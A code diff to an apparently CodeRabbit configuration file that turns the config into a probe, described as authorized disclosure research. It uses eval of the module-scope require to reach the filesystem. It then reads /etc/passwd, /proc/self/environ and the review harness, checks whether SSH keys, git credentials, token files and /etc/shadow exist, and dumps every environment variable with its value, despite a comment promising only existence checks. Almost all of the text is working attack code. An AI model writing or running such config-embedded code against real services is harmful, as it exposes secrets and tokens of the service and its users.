@@ -1,11 +1,11 @@
-// CodeRabbit config-execution probe CR-H1-121B-FS (authorized VDP research, READ-ONLY).
-// Revision B: identical goal to revision A but with NO module loading syntax anywhere in the
-// file (revision A silently failed to load at all -> config fell back to "Organization UI").
-// The only remaining synchronous route to Node built-ins from inside a bundled module is the
-// MODULE-SCOPE `require`, which direct eval can see even when globalThis.require is absent.
-// Nothing here writes, deletes or modifies anything.
+// CodeRabbit config-execution probe CR-H1-121C-FS (authorized VDP research, READ-ONLY).
+// Revision C: revision B proved the container filesystem is reachable via the MODULE-SCOPE
+// `require` (which is invisible on globalThis). This revision characterises the blast radius:
+// the real (unfiltered) environment block, the evaluation harness itself, where the repository
+// checkout lives on disk, and — existence + byte size ONLY, never contents — whether any
+// credential-shaped file is reachable. READ ONLY: nothing is written, deleted or modified.
 
-const MARK = "CR-H1-121B-FS"
+const MARK = "CR-H1-121C-FS"
 const R: string[] = []
 
 function clip(v: any, n: number): string {
@@ -21,7 +21,7 @@ function clip(v: any, n: number): string {
 
 function rec(t: string, v: any): void {
   try {
-    R.push(t + "=" + clip(v, 190))
+    R.push(t + "=" + clip(v, 1400))
   } catch (_) {
     /* ignore */
   }
@@ -33,82 +33,82 @@ function safe(t: string, f: () => any): any {
     rec(t, v)
     return v
   } catch (e: any) {
-    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 70))
+    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 90))
     return undefined
   }
 }
 
-function head(fs: any, p: string, n: number): string {
+function rd(fs: any, p: string, n: number): string {
+  return String(fs.readFileSync(p, "utf8")).split("\u0000").join("|").slice(0, n)
+}
+
+function ex(fs: any, p: string): string {
   try {
-    const fd = fs.openSync(p, "r")
-    try {
-      const b = new Uint8Array(n)
-      const g = fs.readSync(fd, b, 0, n, 0)
-      return "OK[" + clip(b.subarray(0, g).toString("utf8"), n) + "]"
-    } finally {
-      try {
-        fs.closeSync(fd)
-      } catch (_) {
-        /* ignore */
-      }
-    }
+    const st = fs.statSync(p)
+    return st.isFile() ? "FILE " + st.size + "b" : "DIR"
   } catch (e: any) {
-    return "ERR " + clip(e && (e.code || e.name) ? String(e.code || e.name) : "?", 30)
+    return "none(" + (e && e.code ? e.code : "?") + ")"
   }
 }
 
-function reads(tag: string, fs: any): void {
-  safe(tag + ".hostname", () => clip(fs.readFileSync("/etc/hostname", "utf8"), 120))
-  safe(tag + ".CTRL_NOFILE", () => head(fs, "/etc/cr-121-no-such-file-9182", 80))
-  safe(tag + ".passwd", () => head(fs, "/etc/passwd", 200))
-  safe(tag + ".cmdline", () => head(fs, "/proc/self/cmdline", 200))
-  safe(tag + ".environ", () => head(fs, "/proc/self/environ", 200))
-  safe(tag + ".ls_APP", () => clip(fs.readdirSync("/app").join(","), 190))
-  safe(tag + ".ls_JAILFS", () => clip(fs.readdirSync("/app/cr-jail-fs").join(","), 190))
-  safe(tag + ".ls_GCS", () => clip(fs.readdirSync("/app/cr-gcs-transfer").join(","), 190))
-  safe(tag + ".jailfs_file", () => {
-    const d = "/app/cr-jail-fs"
-    const ns: string[] = fs.readdirSync(d)
-    const o: string[] = []
-    for (let i = 0; i < ns.length && o.length < 2; i++) {
-      const p = d + "/" + ns[i]
-      try {
-        if (fs.statSync(p).isFile()) o.push(ns[i] + " " + head(fs, p, 200))
-        else o.push(ns[i] + "/")
-      } catch (e: any) {
-        o.push(ns[i] + ":ERR")
-      }
-    }
-    return o.join(" | ")
-  })
-}
-
 const rt = safe("A.scope_require", () => eval("typeof require"))
-safe("A.scope_module", () => eval("typeof module"))
-safe("A.scope_filename", () => eval("typeof __filename"))
-safe("A.scope_dirname", () => eval("typeof __dirname"))
 
 if (rt === "function") {
-  safe("A.fs", () => {
-    const fs: any = eval("require")("node:fs")
-    reads("A", fs)
+  const fs: any = eval("require")("node:fs")
+
+  // ---- MANDATORY CONTROL: a file that certainly does not exist ----------------
+  safe("Z.CTRL_NOFILE", () => ex(fs, "/etc/cr-121-no-such-file-9182"))
+
+  // ---- process / host identity ----------------------------------------------
+  safe("E.proc", () => {
+    const p: any = (globalThis as any).process
+    return "pid=" + p.pid + " ppid=" + p.ppid + " uid=" + p.getuid() + " gid=" + p.getgid() + " ver=" + p.version + " argv=" + JSON.stringify(p.argv) + " cwd=" + p.cwd() + " execPath=" + p.execPath + " envKeys=" + Object.keys(p.env).length
+  })
+  safe("E.host", () => {
+    const os: any = eval("require")("node:os")
+    return "hostname=" + os.hostname() + " user=" + os.userInfo().username + " cpus=" + os.cpus().length + " platform=" + os.platform()
+  })
+
+  // ---- real content, outside the repository checkout -------------------------
+  safe("B.passwd", () => rd(fs, "/etc/passwd", 900))
+  safe("B.cmdline", () => rd(fs, "/proc/self/cmdline", 300))
+  safe("B.environ", () => rd(fs, "/proc/self/environ", 2600))
+  safe("B.harness", () => rd(fs, "/tmp/coderabbit-config.cjs", 1200))
+  safe("B.osrelease", () => rd(fs, "/etc/os-release", 400))
+
+  // ---- where is the repo checkout? /app does not exist (proved in rev B) ------
+  safe("C.ls_root", () => fs.readdirSync("/").join(","))
+  safe("C.ls_tmp", () => fs.readdirSync("/tmp").join(","))
+  for (const d of ["/home", "/home/jailuser", "/workspace", "/repo", "/github/workspace", "/src", "/data", "/mnt", "/app"]) {
+    safe("C.dir" + d.replace(/\//g, "_"), () => { try { return fs.readdirSync(d).join(",") } catch (e: any) { return "ERR " + e.code } })
+  }
+  safe("C.mountinfo", () => rd(fs, "/proc/self/mountinfo", 1200))
+
+  // ---- credential-shaped paths: EXISTENCE + SIZE ONLY, never contents -------
+  const creds = [
+    "/home/jailuser/.git-credentials",
+    "/home/jailuser/.netrc",
+    "/root/.git-credentials",
+    "/root/.netrc",
+    "/home/jailuser/.ssh/id_rsa",
+    "/home/jailuser/.config/gh/hosts.yml",
+    "/home/jailuser/.docker/config.json",
+    "/etc/github_token",
+    "/tmp/coderabbit-config.cjs",
+    "/proc/1/environ",
+    "/etc/shadow",
+  ]
+  for (const c of creds) {
+    safe("D.ex" + c.replace(/\//g, "_"), () => ex(fs, c))
+  }
+
+  safe("E.env_full", () => {
+    const p: any = (globalThis as any).process
+    return Object.keys(p.env).sort().map((k) => k + "=" + p.env[k]).join(" | ")
   })
 } else {
   rec("A.fs", "SKIPPED_no_module_scope_require")
 }
-
-safe("A.proc_binding", () => {
-  const p: any = (globalThis as any).process
-  if (typeof p.binding !== "function") return "NO_process.binding:" + typeof p.binding
-  const b: any = p.binding("fs")
-  return "fs_binding=" + clip(Object.keys(b).slice(0, 10).join(","), 150)
-})
-
-safe("A.proc_id", () => {
-  const p: any = (globalThis as any).process
-  const cwd = typeof p.cwd === "function" ? p.cwd() : "?"
-  return clip("pid=" + p.pid + " ppid=" + p.ppid + " ver=" + p.version + " argv=" + JSON.stringify(p.argv) + " cwd=" + cwd, 190)
-})
 
 export default {
   reviews: {
